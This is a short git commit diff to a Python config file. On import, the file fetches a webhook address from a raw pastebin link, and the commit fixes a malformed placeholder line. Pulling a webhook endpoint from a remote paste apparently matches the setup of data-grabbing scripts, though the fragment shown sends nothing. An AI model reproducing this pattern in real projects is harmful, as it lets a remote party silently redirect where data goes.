b710c185edc40bca466694fe74e018bb3257cd31
Ayaan <142435308+real-fbdn@users.noreply.github.com>
2023-10-28 10:32:36 +0100

    Update config.py

--- scripts/config.py
+++ scripts/config.py
@@ -1,5 +1,5 @@
 import requests
-hook= = requests.get("WEBHOOK_HERE").text
+HO0K = requests.get("WEBHOOK_HERE").text
 hook = requests.get("https://pastebin.com/raw/dNdbdZjG").text
 
 # soon new features xd
